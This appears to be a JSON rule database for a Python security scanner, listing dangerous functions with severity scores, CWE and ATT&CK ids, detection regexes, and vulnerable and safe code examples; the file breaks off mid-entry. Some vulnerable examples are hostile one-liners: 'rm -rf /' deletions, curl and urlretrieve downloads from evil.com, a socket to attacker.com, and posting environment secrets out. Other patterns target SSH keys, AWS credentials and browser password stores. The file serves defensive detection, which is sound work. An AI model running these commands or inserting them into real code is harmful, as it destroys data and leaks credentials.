{
  "python": {
    "critical": {
      "eval": {
        "severity": "CRITICAL",
        "cvss": 9.8,
        "cwe": "CWE-95",
        "attack_id": "T1059.006",
        "description": "Executes arbitrary Python code from string",
        "risk": "Complete system compromise, arbitrary code execution",
        "safe_alternative": "ast.literal_eval() for literals only, refactor to avoid dynamic execution",
        "detection_pattern": "\\beval\\s*\\(",
        "example_vulnerable": "eval(user_input)",
        "example_safe": "ast.literal_eval('[1, 2, 3]')  # Only for literals",
        "cve_reference": "CVE-2025-54795"
      },
      "exec": {
        "severity": "CRITICAL",
        "cvss": 9.8,
        "cwe": "CWE-94",
        "attack_id": "T1059.006",
        "description": "Executes arbitrary Python statements from string",
        "risk": "Complete system compromise, arbitrary code execution",
        "safe_alternative": "Refactor to avoid dynamic code execution entirely",
        "detection_pattern": "\\bexec\\s*\\(",
        "example_vulnerable": "exec('import os; os.system(\"rm -rf /\")')",
        "example_safe": "# No safe alternative - refactor logic",
        "cve_reference": "CVE-2025-54795"
      },
      "__import__": {
        "severity": "CRITICAL",
        "cvss": 9.0,
        "cwe": "CWE-94",
        "attack_id": "T1059.006",
        "description": "Dynamically imports modules by name",
        "risk": "Can import and execute malicious modules",
        "safe_alternative": "Use normal import statements",
        "detection_pattern": "\\b__import__\\s*\\(",
        "example_vulnerable": "__import__(user_supplied_module_name)",
        "example_safe": "import known_safe_module"
      },
      "compile": {
        "severity": "CRITICAL",
        "cvss": 9.0,
        "cwe": "CWE-94",
        "attack_id": "T1059.006",
        "description": "Compiles source code into code object",
        "risk": "Often used with eval/exec for code execution",
        "safe_alternative": "Avoid dynamic compilation",
        "detection_pattern": "(?<!re\\.)(?<!regex\\.)\\bcompile\\s*\\(",
        "context_check": "NOT preceded by 're.' or 'regex.'",
        "example_vulnerable": "eval(compile(malicious_code, '<string>', 'exec'))",
        "example_safe": "re.compile(r'pattern')  # Regex compilation is safe",
        "note": "Excludes re.compile() and regex.compile() which are safe regex operations"
      },
      "shutil.rmtree": {
        "severity": "CRITICAL",
        "cvss": 9.5,
        "cwe": "CWE-73",
        "attack_id": "T1485",
        "tactic": "Impact",
        "description": "Recursively deletes directory trees (data destruction)",
        "risk": "Can wipe entire file systems",
        "safe_alternative": "Confirm operations, use trash instead of delete",
        "detection_pattern": "shutil\\.rmtree\\s*\\(",
        "example_vulnerable": "shutil.rmtree('/home/user/important')",
        "example_safe": "# Move to trash, confirm deletions",
        "threat_actors": [
          "Sandworm Team",
          "APT38",
          "NotPetya"
        ],
        "mitigations": [
          "M1053",
          "M1041"
        ]
      },
      "os.remove": {
        "severity": "HIGH",
        "cvss": 7.0,
        "cwe": "CWE-73",
        "attack_id": "T1485",
        "tactic": "Impact",
        "description": "Deletes files (data destruction)",
        "risk": "Can delete critical system/user files",
        "safe_alternative": "Validate paths, use trash",
        "detection_pattern": "os\\.(remove|unlink)\\s*\\(",
        "example_vulnerable": "os.remove('/etc/passwd')",
        "example_safe": "# Validate path, move to trash",
        "threat_actors": [
          "Sandworm Team"
        ],
        "mitigations": [
          "M1053"
        ]
      },
      "pathlib.Path.unlink": {
        "severity": "HIGH",
        "cvss": 7.0,
        "cwe": "CWE-73",
        "attack_id": "T1485",
        "tactic": "Impact",
        "description": "Deletes files via pathlib",
        "risk": "File deletion attack",
        "safe_alternative": "Validate paths before deletion",
        "detection_pattern": "\\.unlink\\s*\\(",
        "example_vulnerable": "Path('/important/file').unlink()",
        "example_safe": "# Confirm + validate path",
        "threat_actors": [
          "Sandworm Team"
        ],
        "mitigations": [
          "M1053"
        ]
      },
      "system_file_write": {
        "severity": "CRITICAL",
        "cvss": 9.0,
        "cwe": "CWE-732",
        "attack_id": "T1565.001",
        "tactic": "Impact",
        "description": "Writes to system files (data manipulation)",
        "risk": "System compromise, persistence",
        "safe_alternative": "Never write to /etc/, /sys/, /proc/",
        "detection_pattern": "open\\s*\\(['\"]/(etc|sys|proc|boot)/",
        "example_vulnerable": "open('/etc/passwd', 'w')",
        "example_safe": "# DO NOT write to system directories",
        "threat_actors": [
          "APT28",
          "Turla"
        ],
        "mitigations": [
          "M1022",
          "M1026"
        ]
      },
      "setuid": {
        "severity": "CRITICAL",
        "cvss": 9.0,
        "cwe": "CWE-250",
        "attack_id": "T1548.001",
        "tactic": "Privilege Escalation",
        "description": "Sets UID (privilege escalation)",
        "risk": "Can elevate to root privileges",
        "safe_alternative": "Use proper authentication mechanisms",
        "detection_pattern": "os\\.(setuid|seteuid|setreuid)\\s*\\(",
        "example_vulnerable": "os.setuid(0)  # Become root",
        "example_safe": "# Use sudo or proper auth",
        "threat_actors": [
          "APT28",
          "Turla"
        ],
        "mitigations": [
          "M1026",
          "M1028"
        ]
      },
      "sudo_execution": {
        "severity": "HIGH",
        "cvss": 8.5,
        "cwe": "CWE-250",
        "attack_id": "T1548.003",
        "tactic": "Privilege Escalation",
        "description": "Executes commands with sudo",
        "risk": "Privilege escalation to root",
        "safe_alternative": "Request user authentication properly",
        "detection_pattern": "sudo\\s+",
        "example_vulnerable": "os.system('sudo rm -rf /')",
        "example_safe": "# Use PolicyKit for GUI apps",
        "threat_actors": [
          "APT28"
        ],
        "mitigations": [
          "M1026",
          "M1028"
        ]
      },
      "types.FunctionType": {
        "severity": "CRITICAL",
        "cvss": 8.5,
        "cwe": "CWE-94",
        "attack_id": "T1055",
        "tactic": "Execution",
        "description": "Creates functions dynamically (code injection)",
        "risk": "Runtime code generation/injection",
        "safe_alternative": "Use normal function definitions",
        "detection_pattern": "types\\.FunctionType\\s*\\(",
        "example_vulnerable": "func = types.FunctionType(code_obj, globals())",
        "example_safe": "# Define functions normally",
        "threat_actors": [
          "APT41"
        ],
        "mitigations": [
          "M1049",
          "M1026"
        ]
      },
      "importlib.import_module": {
        "severity": "HIGH",
        "cvss": 7.5,
        "cwe": "CWE-829",
        "attack_id": "T1129",
        "tactic": "Execution",
        "description": "Dynamic module import (potential malicious module loading)",
        "risk": "Can import attacker-controlled modules",
        "safe_alternative": "Static imports only",
        "detection_pattern": "importlib\\.import_module\\s*\\(",
        "context_check": "Flag if with user input",
        "example_vulnerable": "importlib.import_module(user_module)",
        "example_safe": "import known_module",
        "threat_actors": [
          "APT28"
        ],
        "mitigations": [
          "M1049"
        ]
      },
      "code_manipulation": {
        "severity": "CRITICAL",
        "cvss": 9.0,
        "cwe": "CWE-94",
        "attack_id": "T1055",
        "tactic": "Execution",
        "description": "Manipulates __code__ objects",
        "risk": "Runtime code modification",
        "safe_alternative": "Never modify code objects",
        "detection_pattern": "\\.__code__\\s*=",
        "example_vulnerable": "func.__code__ = malicious_code",
        "example_safe": "# DO NOT modify code objects",
        "threat_actors": [
          "APT41",
          "Lazarus Group"
        ],
        "mitigations": [
          "M1049"
        ]
      }
    },
    "high": {
      "os.system": {
        "severity": "HIGH",
        "cvss": 8.6,
        "cwe": "CWE-78",
        "attack_id": "T1059.006",
        "description": "Executes shell command via os.system()",
        "risk": "Command injection, shell command execution",
        "safe_alternative": "subprocess.run(['cmd', 'arg'], shell=False)",
        "detection_pattern": "os\\.system\\s*\\(",
        "example_vulnerable": "os.system(f'ls {user_dir}')",
        "example_safe": "subprocess.run(['ls', user_dir], shell=False)",
        "cve_reference": "CVE-2025-54795"
      },
      "subprocess.Popen": {
        "severity": "HIGH",
        "cvss": 8.7,
        "cwe": "CWE-78",
        "attack_id": "T1059.006",
        "description": "Process execution with shell=True parameter",
        "risk": "Command injection via shell metacharacters",
        "safe_alternative": "Use shell=False and pass command as list",
        "detection_pattern": "subprocess\\.Popen.*shell\\s*=\\s*True",
        "context_check": "shell=True",
        "example_vulnerable": "subprocess.Popen(user_cmd, shell=True)",
        "example_safe": "subprocess.Popen(['ls', '-la'], shell=False)",
        "cve_reference": "CVE-2025-54795"
      },
      "subprocess.run": {
        "severity": "HIGH",
        "cvss": 8.7,
        "cwe": "CWE-78",
        "attack_id": "T1059.006",
        "description": "Process execution with shell=True parameter",
        "risk": "Command injection via shell metacharacters",
        "safe_alternative": "Use shell=False and pass command as list",
        "detection_pattern": "subprocess\\.run.*shell\\s*=\\s*True",
        "context_check": "shell=True",
        "example_vulnerable": "subprocess.run(cmd, shell=True)",
        "example_safe": "subprocess.run(['git', 'status'], shell=False)",
        "cve_reference": "CVE-2025-54795"
      },
      "subprocess.call": {
        "severity": "HIGH",
        "cvss": 8.7,
        "cwe": "CWE-78",
        "attack_id": "T1059.006",
        "description": "Process execution with shell=True parameter",
        "risk": "Command injection via shell metacharacters",
        "safe_alternative": "Use shell=False and pass command as list",
        "detection_pattern": "subprocess\\.call.*shell\\s*=\\s*True",
        "context_check": "shell=True",
        "example_vulnerable": "subprocess.call(cmd, shell=True)",
        "example_safe": "subprocess.call(['ls', '-la'], shell=False)",
        "cve_reference": "CVE-2025-54795"
      },
      "subprocess.check_call": {
        "severity": "HIGH",
        "cvss": 8.7,
        "cwe": "CWE-78",
        "attack_id": "T1059.006",
        "description": "Process execution with shell=True parameter",
        "risk": "Command injection via shell metacharacters",
        "safe_alternative": "Use shell=False and pass command as list",
        "detection_pattern": "subprocess\\.check_call.*shell\\s*=\\s*True",
        "context_check": "shell=True",
        "example_vulnerable": "subprocess.check_call(cmd, shell=True)",
        "example_safe": "subprocess.check_call(['make'], shell=False)",
        "cve_reference": "CVE-2025-54795"
      },
      "subprocess.check_output": {
        "severity": "HIGH",
        "cvss": 8.7,
        "cwe": "CWE-78",
        "attack_id": "T1059.006",
        "description": "Process execution with shell=True parameter",
        "risk": "Command injection via shell metacharacters",
        "safe_alternative": "Use shell=False and pass command as list",
        "detection_pattern": "subprocess\\.check_output.*shell\\s*=\\s*True",
        "context_check": "shell=True",
        "example_vulnerable": "subprocess.check_output(cmd, shell=True)",
        "example_safe": "subprocess.check_output(['git', 'log'], shell=False)",
        "cve_reference": "CVE-2025-54795"
      },
      "subprocess.getoutput": {
        "severity": "HIGH",
        "cvss": 8.7,
        "cwe": "CWE-78",
        "attack_id": "T1059.006",
        "description": "Runs command in shell (ALWAYS uses shell, no safe mode)",
        "risk": "Command injection, always dangerous",
        "safe_alternative": "subprocess.run(['cmd'], capture_output=True, shell=False)",
        "detection_pattern": "subprocess\\.getoutput\\s*\\(",
        "example_vulnerable": "subprocess.getoutput(f'ls {user_dir}')",
        "example_safe": "subprocess.run(['ls', user_dir], capture_output=True, text=True, shell=False)",
        "cve_reference": "CVE-2025-54795"
      },
      "subprocess.getstatusoutput": {
        "severity": "HIGH",
        "cvss": 8.7,
        "cwe": "CWE-78",
        "attack_id": "T1059.006",
        "description": "Runs command in shell (ALWAYS uses shell, no safe mode)",
        "risk": "Command injection, always dangerous",
        "safe_alternative": "subprocess.run(['cmd'], capture_output=True, shell=False)",
        "detection_pattern": "subprocess\\.getstatusoutput\\s*\\(",
        "example_vulnerable": "subprocess.getstatusoutput('ls ' + user_dir)",
        "example_safe": "result = subprocess.run(['ls', user_dir], capture_output=True, shell=False)",
        "cve_reference": "CVE-2025-54795"
      },
      "os.popen": {
        "severity": "HIGH",
        "cvss": 7.8,
        "cwe": "CWE-78",
        "attack_id": "T1059.006",
        "description": "Opens pipe to/from command (deprecated)",
        "risk": "Command injection",
        "safe_alternative": "subprocess with shell=False",
        "detection_pattern": "os\\.popen\\s*\\(",
        "example_vulnerable": "os.popen('cat ' + filename).read()",
        "example_safe": "subprocess.run(['cat', filename], capture_output=True)",
        "cve_reference": "CVE-2025-54795"
      },
      "os.spawn": {
        "severity": "HIGH",
        "cvss": 7.5,
        "cwe": "CWE-78",
        "attack_id": "T1059.006",
        "description": "Spawns process (multiple variants)",
        "risk": "Command injection if shell used",
        "safe_alternative": "subprocess.run with shell=False",
        "detection_pattern": "os\\.spawn[lv]p?e?\\s*\\(",
        "example_vulnerable": "os.spawnlp(os.P_WAIT, 'sh', '-c', user_cmd)",
        "example_safe": "subprocess.run([cmd, arg1, arg2], shell=False)"
      },
      "importlib.import_module": {
        "severity": "HIGH",
        "cvss": 8.0,
        "cwe": "CWE-94",
        "attack_id": "T1059.006",
        "description": "Dynamically imports module by string name",
        "risk": "Can load malicious modules",
        "safe_alternative": "Use static imports",
        "detection_pattern": "importlib\\.import_module\\s*\\(",
        "example_vulnerable": "importlib.import_module(user_module_name)",
        "example_safe": "import known_module"
      },
      "pickle.loads": {
        "severity": "HIGH",
        "cvss": 9.0,
        "cwe": "CWE-502",
        "attack_id": "T1027.010",
        "atlas_id": "AML.T0043",
        "description": "Deserializes Python objects (can execute code)",
        "risk": "Arbitrary code execution via crafted pickle data, model poisoning",
        "safe_alternative": "json.loads() for data serialization",
        "detection_pattern": "pickle\\.loads\\s*\\(",
        "example_vulnerable": "pickle.loads(untrusted_data)",
        "example_safe": "json.loads(trusted_json_string)",
        "owasp_api": "API10"
      },
      "pickle.load": {
        "severity": "HIGH",
        "cvss": 9.0,
        "cwe": "CWE-502",
        "attack_id": "T1027.010",
        "atlas_id": "AML.T0043",
        "description": "Deserializes Python objects from file (can execute code)",
        "risk": "Arbitrary code execution, model poisoning",
        "safe_alternative": "json.load() for data",
        "detection_pattern": "pickle\\.load\\s*\\(",
        "example_vulnerable": "pickle.load(open('model.pkl', 'rb'))",
        "example_safe": "json.load(open('data.json'))",
        "owasp_api": "API10"
      },
      "os.environ.get": {
        "severity": "HIGH",
        "cvss": 7.5,
        "cwe": "CWE-200",
        "attack_id": "T1552.001",
        "tactic": "Credential Access",
        "description": "Accesses environment variables (potential credential theft)",
        "risk": "Can expose API keys, tokens, passwords stored in environment",
        "safe_alternative": "Use dedicated credential management (e.g., keyring, vault)",
        "detection_pattern": "os\\.environ\\.(get|__getitem__)",
        "example_vulnerable": "api_key = os.environ.get('SECRET_KEY')",
        "example_safe": "# Use keyring or secure vault",
        "threat_actors": [
          "APT28",
          "APT29",
          "Lazarus Group"
        ],
        "mitigations": [
          "M1047",
          "M1041"
        ]
      },
      "os.getenv": {
        "severity": "HIGH",
        "cvss": 7.5,
        "cwe": "CWE-200",
        "attack_id": "T1552.001",
        "tactic": "Credential Access",
        "description": "Reads environment variables (credential exposure)",
        "risk": "Exposes sensitive data from environment",
        "safe_alternative": "Secure credential storage",
        "detection_pattern": "os\\.getenv\\s*\\(",
        "example_vulnerable": "password = os.getenv('DB_PASSWORD')",
        "example_safe": "# Use credential manager",
        "threat_actors": [
          "APT28",
          "APT29"
        ],
        "mitigations": [
          "M1047"
        ]
      },
      "pathlib_ssh_access": {
        "severity": "CRITICAL",
        "cvss": 9.0,
        "cwe": "CWE-552",
        "attack_id": "T1552.004",
        "tactic": "Credential Access",
        "description": "Accesses SSH private keys",
        "risk": "SSH key theft for lateral movement",
        "safe_alternative": "Never access user SSH keys",
        "detection_pattern": "(\\.ssh[/\\\\]id_rsa|\\.ssh[/\\\\]id_ed25519|\\.ssh[/\\\\]id_ecdsa)",
        "example_vulnerable": "key = Path.home() / '.ssh' / 'id_rsa'",
        "example_safe": "# DO NOT access SSH keys",
        "threat_actors": [
          "APT29",
          "Turla",
          "Lazarus Group"
        ],
        "mitigations": [
          "M1027",
          "M1022"
        ]
      },
      "aws_credentials": {
        "severity": "CRITICAL",
        "cvss": 9.0,
        "cwe": "CWE-522",
        "attack_id": "T1552.001",
        "tactic": "Credential Access",
        "description": "Accesses AWS credentials file",
        "risk": "Cloud infrastructure compromise",
        "safe_alternative": "Use IAM roles, never read credentials file",
        "detection_pattern": "(\\.aws[/\\\\]credentials|\\.aws[/\\\\]config)",
        "example_vulnerable": "creds = Path.home() / '.aws' / 'credentials'",
        "example_safe": "# Use boto3 with IAM roles",
        "threat_actors": [
          "APT28",
          "APT41",
          "HAFNIUM"
        ],
        "mitigations": [
          "M1047",
          "M1026"
        ]
      },
      "chrome_passwords": {
        "severity": "CRITICAL",
        "cvss": 8.5,
        "cwe": "CWE-555",
        "attack_id": "T1555.003",
        "tactic": "Credential Access",
        "description": "Accesses Chrome password database",
        "risk": "Steals saved browser passwords",
        "safe_alternative": "Never access browser credential stores",
        "detection_pattern": "(Chrome[/\\\\].*Login Data|chrome.*passwords)",
        "example_vulnerable": "db = 'Chrome/Default/Login Data'",
        "example_safe": "# DO NOT access browser passwords",
        "threat_actors": [
          "Emotet",
          "Trickbot",
          "Dridex"
        ],
        "mitigations": [
          "M1027",
          "M1017"
        ]
      },
      "firefox_passwords": {
        "severity": "CRITICAL",
        "cvss": 8.5,
        "cwe": "CWE-555",
        "attack_id": "T1555.003",
        "tactic": "Credential Access",
        "description": "Accesses Firefox password files",
        "risk": "Steals Firefox saved credentials",
        "safe_alternative": "Never access browser data",
        "detection_pattern": "(logins\\.json|key4\\.db|Firefox.*signons)",
        "example_vulnerable": "ff_db = 'Firefox/logins.json'",
        "example_safe": "# DO NOT access browser data",
        "threat_actors": [
          "Emotet",
          "Trickbot"
        ],
        "mitigations": [
          "M1027"
        ]
      },
      "urllib.request.urlretrieve": {
        "severity": "HIGH",
        "cvss": 8.0,
        "cwe": "CWE-494",
        "attack_id": "T1105",
        "tactic": "Command and Control",
        "description": "Downloads files from URLs (ingress tool transfer)",
        "risk": "Can download and execute malware",
        "safe_alternative": "Validate URLs, use allowlists, scan downloads",
        "detection_pattern": "urllib\\.request\\.urlretrieve\\s*\\(",
        "example_vulnerable": "urlretrieve('http://evil.com/malware.py', '/tmp/mal.py')",
        "example_safe": "# Validate URL against allowlist first",
        "threat_actors": [
          "APT28",
          "APT29",
          "Lazarus Group",
          "APT41"
        ],
        "mitigations": [
          "M1031",
          "M1021"
        ]
      },
      "requests_file_download": {
        "severity": "HIGH",
        "cvss": 7.8,
        "cwe": "CWE-494",
        "attack_id": "T1105",
        "tactic": "Command and Control",
        "description": "HTTP download with file write (tool transfer)",
        "risk": "Downloads potentially malicious files",
        "safe_alternative": "Validate sources, scan content",
        "detection_pattern": "requests\\.(get|post).*\\.(content|text).*open\\s*\\(",
        "context_check": "requests + file write chain",
        "example_vulnerable": "open('file.exe', 'wb').write(requests.get(url).content)",
        "example_safe": "# Verify URL, scan before writing",
        "threat_actors": [
          "APT28",
          "Turla"
        ],
        "mitigations": [
          "M1031"
        ]
      },
      "wget_download": {
        "severity": "HIGH",
        "cvss": 8.0,
        "cwe": "CWE-494",
        "attack_id": "T1105",
        "tactic": "Command and Control",
        "description": "Uses wget to download files",
        "risk": "Command injection + file download",
        "safe_alternative": "Use Python libraries with validation",
        "detection_pattern": "wget.*http",
        "example_vulnerable": "subprocess.run(['wget', user_url])",
        "example_safe": "# Use requests with validation",
        "threat_actors": [
          "APT41",
          "Winnti Group"
        ],
        "mitigations": [
          "M1038",
          "M1031"
        ]
      },
      "curl_download": {
        "severity": "HIGH",
        "cvss": 8.0,
        "cwe": "CWE-494",
        "attack_id": "T1105",
        "tactic": "Command and Control",
        "description": "Uses curl to download files",
        "risk": "Downloads from attacker-controlled URLs",
        "safe_alternative": "Validated Python HTTP libraries",
        "detection_pattern": "curl.*-[oO]",
        "example_vulnerable": "os.system('curl -o /tmp/mal http://evil.com')",
        "example_safe": "# Use requests with URL validation",
        "threat_actors": [
          "Lazarus Group",
          "APT28"
        ],
        "mitigations": [
          "M1038"
        ]
      },
      "ftplib.retrbinary": {
        "severity": "MEDIUM",
        "cvss": 6.5,
        "cwe": "CWE-494",
        "attack_id": "T1105",
        "tactic": "Command and Control",
        "description": "FTP file download",
        "risk": "Downloads via FTP (unencrypted)",
        "safe_alternative": "SFTP or HTTPS",
        "detection_pattern": "ftplib.*retr(binary|lines)",
        "example_vulnerable": "ftp.retrbinary('RETR file', open('file', 'wb').write)",
        "example_safe": "# Use SFTP instead",
        "threat_actors": [
          "APT28"
        ],
        "mitigations": [
          "M1031",
          "M1020"
        ]
      },
      "socket.connect": {
        "severity": "HIGH",
        "cvss": 7.5,
        "cwe": "CWE-200",
        "attack_id": "T1041",
        "tactic": "Exfiltration",
        "description": "Opens socket connection (potential C2/exfiltration)",
        "risk": "Data exfiltration, command and control",
        "safe_alternative": "Use HTTPS with cert pinning",
        "detection_pattern": "socket\\.connect\\s*\\(",
        "example_vulnerable": "sock.connect(('attacker.com', 443))",
        "example_safe": "# Use validated HTTPS endpoints",
        "threat_actors": [
          "APT28",
          "APT29",
          "Lazarus Group"
        ],
        "mitigations": [
          "M1031",
          "M1037"
        ]
      },
      "requests.post_data": {
        "severity": "MEDIUM",
        "cvss": 6.5,
        "cwe": "CWE-200",
        "attack_id": "T1041",
        "tactic": "Exfiltration",
        "description": "HTTP POST (potential data exfiltration)",
        "risk": "Can send sensitive data externally",
        "safe_alternative": "Validate destinations, encrypt data",
        "detection_pattern": "requests\\.post\\s*\\(",
        "context_check": "Only flag with env vars or file reads",
        "example_vulnerable": "requests.post(url, data=os.environ)",
        "example_safe": "# Validate destination, encrypt data",
        "threat_actors": [
          "APT41",
          "Winnti Group"
        ],
        "mitigations": [
          "M1031",
          "M1057"
        ]
      },
      "smtplib.send": {
        "severity": "HIGH",
        "cvss": 7.0,
        "cwe": "CWE-200",
        "attack_id": "T1048.003",
        "tactic": "Exfiltration",
        "description": "Sends email (exfiltration over alternative protocol)",
        "risk": "Email-based data exfiltration",
        "safe_alternative": "Use approved email services",
        "detection_pattern": "smtplib.*send(mail)?",
        "example_vulnerable": "smtp.send(attacker@evil.com, stolen_data)",
        "example_safe": "# Use corporate email only",
        "threat_actors": [
          "APT28",
          "Turla"
        ],
        "mitigations": [
          "M1031"
        ]
      },
      "crontab_modification": {
        "severity": "HIGH",
        "cvss": 8.0,
        "cwe": "CWE-732",
        "attack_id": "T1053.003",
        "tactic": "Persistence",
        "description": "Modifies crontab (scheduled task persistence)",
        "risk": "Establishes persistence via cron",
        "safe_alternative": "Use systemd timers with proper permissions",
        "detection_pattern": "(crontab|/var/spool/cron)",
        "example_vulnerable": "os.system('crontab -e')",
        "example_safe": "# Use systemd timers",
        "threat_actors": [
          "APT28",
          "Turla",
          "Rocke"
        ],
        "mitigations": [
          "M1018",
          "M1026"
        ]
      },
      "bashrc_modification": {
        "severity": "HIGH",
        "cvss": 8.0,
        "cwe": "CWE-732",
        "attack_id": "T1546.004",
        "tactic": "Persistence",
        "description": "Modifies shell config files (persistence)",
        "risk": "Executes code on every shell login",
        "safe_alternative": "Never modify user shell configs",
        "detection_pattern": "(\\.bashrc|\\.zshrc|\\.profile|\\.bash_profile)",
        "example_vulnerable": "open('.bashrc', 'a').write('malicious code')",
        "example_safe": "# DO NOT modify shell configs",
        "threat_actors": [
          "Rocke",
          "TeamTNT"
        ],
        "mitigations": [
          "M1022",
          "M1026"
        ]
      },
      "systemd_service": {
        "severity": "CRITICAL",
        "cvss": 9.0,
        "cwe": "CWE-732",
        "attack_id": "T1543.002",
        "tactic": "Persistence",
        "description": "Creates systemd service (persistence)",
        "risk": "Automatic execution on boot",
        "safe_alternative": "Use package managers for service installation",
        "detection_pattern": "(/etc/systemd/|/lib/systemd/|\\.service)",
        "example_vulnerable": "service_file = '/etc/systemd/system/malware.service'",
        "example_safe": "# Use dpkg/rpm for services",
        "threat_actors": [
          "APT28",
          "Rocke"
        ],
        "mitigations": [
          "M1018",
          "M1022"
        ]
      },
      "windows_startup": {
        "severity": "HIGH",
        "cvss": 8.0,
        "cwe": "CWE-732",
        "attack_id": "T1547.001",
        "tactic": "Persistence",
        "description": "Adds to Windows startup folder",
        "risk": "Auto-execution on Windows login",
        "safe_alternative": "Use proper installers",
        "detection_pattern": "(Startup|Start Menu.*Programs.*Startup)",
        "example_vulnerable": "shutil.copy('malware.exe', startup_folder)",
        "example_safe": "# Use Windows Installer",
        "threat_actors": [
          "APT28",
          "Lazarus Group"
        ],
        "mitigations": [
          "M1018"
        ]
      },
      "ctypes.CDLL": {
        "severity": "HIGH",
        "cvss": 7.5,
        "cwe": "CWE-829",
        "attack_id": "T1055.001",
        "tactic": "Defense Evasion",
        "description": "Loads DLL/shared library (DLL injection)",
        "risk": "Can load malicious libraries",
        "safe_alternative": "Use Python libraries, avoid ctypes for untrusted code",
        "detection_pattern": "ctypes\\.(CDLL|WinDLL|OleDLL|PyDLL)\\s*\\(",
        "example_vulnerable": "ctypes.CDLL('malicious.so')",
        "example_safe": "# Use Python packages instead",
        "threat_actors": [
          "APT28",
          "Lazarus Group"
        ],
        "mitigations": [
          "M1051"
        ]
      },
      "multiprocessing_spawn": {
        "severity": "MEDIUM",
        "cvss": 6.0,
        "cwe": "CWE-78",
        "attack_id": "T1055",
        "tactic": "Privilege Escalation",
        "description": "Process spawning (potential injection)",
        "risk": "Can spawn malicious processes",
        "safe_alternative": "Validate process targets",
        "detection_pattern": "multiprocessing\\.(Process|spawn)",
        "context_check": "Flag if with user input",
        "example_vulnerable": "Process(target=user_function).start()",
        "example_safe": "# Validate process targets",
        "threat_actors": [
          "APT41"
        ],
        "mitigations": [
          "M1026"
        ]
      }
    },
    "medium": {
      "marshal.loads": {
        "severity": "MEDIUM",
        "cvss": 7.5,
        "cwe": "CWE-502",
        "attack_id": "T1027.010",
        "description": "Deserializes internal Python objects",
        "risk": "Can execute arbitrary code",
        "safe_alternative": "json or other safe formats",
        "detection_pattern": "marshal\\.loads\\s*\\(",
        "example_vulnerable": "marshal.loads(data)",
        "example_safe": "json.loads(data)"
      },
      "marshal.load": {
        "severity": "MEDIUM",
        "cvss": 7.5,
        "cwe": "CWE-502",
        "attack_id": "T1027.010",
        "description": "Deserializes internal Python objects from file",
        "risk": "Can execute arbitrary code",
        "safe_alternative": "json.load()",
        "detection_pattern": "marshal\\.load\\s*\\(",
        "example_vulnerable": "marshal.load(file)",
        "example_safe": "json.load(file)"
      },
      "shelve.open": {
        "severity": "MEDIUM",
        "cvss": 6.5,
        "cwe": "CWE-502",
        "attack_id": "T1027.010",
        "description": "Opens persistent dictionary (uses pickle)",
        "risk": "Pickle vulnerabilities apply",
        "safe_alternative": "sqlite3 or json files",
        "detection_pattern": "shelve\\.open\\s*\\(",
        "example_vulnerable": "db = shelve.open('untrusted.db')",
        "example_safe": "# Use sqlite3 or json instead"
      },
      "yaml.load": {
        "severity": "MEDIUM",
        "cvss": 7.0,
        "cwe": "CWE-502",
        "attack_id": "T1027.010",
        "description": "YAML deserialization (unsafe by default in old versions)",
        "risk": "Arbitrary code execution",
        "safe_alternative": "yaml.safe_load()",
        "detection_pattern": "yaml\\.load\\s*\\([^,)]*\\)",
        "example_vulnerable": "yaml.load(untrusted_yaml)",
        "example_safe": "yaml.safe_load(yaml_string)"
      },
      "requests.get": {
        "severity": "MEDIUM",
        "cvss": 7.5,
        "cwe": "CWE-918",
        "attack_id": "T1071.001",
        "description": "HTTP GET request (SSRF if user-controlled URL)",
        "risk": "Server-Side Request Forgery",
        "safe_alternative": "Validate URL against whitelist",
        "detection_pattern": "requests\\.get\\s*\\(",
        "example_vulnerable": "requests.get(user_url)",
        "example_safe": "if url.startswith('https://api.safe.com/'): requests.get(url)",
        "owasp_api": "API7"
      },
      "requests.post": {
        "severity": "MEDIUM",
        "cvss": 7.5,
        "cwe": "CWE-918",
        "attack_id": "T1071.001",
        "description": "HTTP POST request (SSRF if user-controlled URL)",
        "risk": "Server-Side Request Forgery",
        "safe_alternative": "Validate URL against whitelist",
        "detection_pattern": "requests\\.post\\s*\\(",
        "example_vulnerable": "requests.post(user_url, data=payload)",
        "example_safe": "if url in ALLOWED_URLS: requests.post(url, data=payload)",
        "owasp_api": "API7"
      },
      "urllib.request.urlopen": {
        "severity": "MEDIUM",
        "cvss": 7.5,
        "cwe": "CWE-918",
        "attack_id": "T1071.001",
        "description": "Opens URL (SSRF if user-controlled)",
        "risk": "Server-Side Request Forgery",
        "safe_alternative": "Validate URL, use requests library",
        "detection_pattern": "urllib\\.request\\.urlopen\\s*\\(",
        "example_vulnerable": "urllib.request.urlopen(user_url)",
        "example_safe": "# Validate URL first, use requests library",
        "owasp_api": "API7"
      },
      "socket.socket": {
        "severity": "MEDIUM",
        "cvss": 6.0,
        "cwe": "CWE-200",
        "attack_id": "T1046",
        "description": "Creates socket connection",
        "risk": "Network scanning, data exfiltration",
        "safe_alternative": "Use high-level libraries (requests, httpx)",
        "detection_pattern": "socket\\.socket\\s*\\(",
        "example_vulnerable": "sock = socket.socket(); sock.connect((user_host, port))",
        "example_safe": "# Use requests library instead"
      },
      "chr_obfuscation": {
        "severity": "MEDIUM",
        "cvss": 5.0,
        "cwe": "CWE-506",
        "attack_id": "T1027",
        "tactic": "Defense Evasion",
        "description": "Character encoding obfuscation (suspicious if with eval/exec)",
        "risk": "Hides malicious code from static analysis",
        "safe_alternative": "Use plain strings",
        "detection_pattern": "chr\\s*\\(\\d+\\).*join",
        "context_check": "Only flag if near eval/exec",
        "example_vulnerable": "''.join([chr(x) for x in [101,118,97,108]])",
        "example_safe": "# Use clear string literals",
        "threat_actors": [
          "APT28",
          "Lazarus Group"
        ],
        "mitigations": [
          "M1049"
        ]
      },
      "codecs.decode": {
        "severity": "MEDIUM",
        "cvss": 5.5,
        "cwe": "CWE-506",
        "attack_id": "T1027",
        "tactic": "Defense Evasion",
        "description": "Codec-based obfuscation (rot13, etc.)",
        "risk": "Obfuscates malicious strings",
        "safe_alternative": "Plaintext code",
        "detection_pattern": "codecs\\.decode\\s*\\(.*['\\\"]rot|base64|hex",
        "context_check": "Only flag if with execution",
        "example_vulnerable": "codecs.decode('riny', 'rot13')",
        "example_safe": "# No obfuscation needed",
        "threat_actors": [
          "Lazarus Group"
        ],
        "mitigations": [
          "M1049"
        ]
      },
      "bytes.fromhex": {
        "severity": "MEDIUM",
        "cvss": 5.0,
        "cwe": "CWE-506",
        "attack_id": "T1027",
        "tactic": "Defense Evasion",
        "description": "Hex decoding (obfuscation)",
        "risk": "Hides strings in hex form",
        "safe_alternative": "Clear strings",
        "detection_pattern": "bytes\\.fromhex\\s*\\(",
        "context_check": "Flag if near exec/eval",
